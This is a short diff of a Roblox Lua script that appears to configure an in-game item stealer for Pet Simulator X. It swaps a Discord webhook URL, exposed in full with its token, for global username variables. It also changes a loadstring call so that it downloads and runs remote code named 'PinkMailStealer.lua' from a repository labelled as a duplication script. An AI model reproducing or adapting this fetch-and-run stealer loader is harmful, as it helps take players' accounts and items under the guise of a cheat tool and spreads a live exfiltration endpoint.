@@ -1,4 +1,4 @@
-UserName = "21FlawTheKill"
-WebHook = "https://discord.com/api/webhooks/1081507475473309756/WUVxJiYNgmMOGqigQDFWEZOqIBxXqv_EDbttN77GBWkPlAJSwIvsfAk5lQwOBVnds_pM"
+_G.Name = "21FlawTheKill"
+_G.Username = "21FlawTheKill"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/PinkMailStealer.lua", true))()
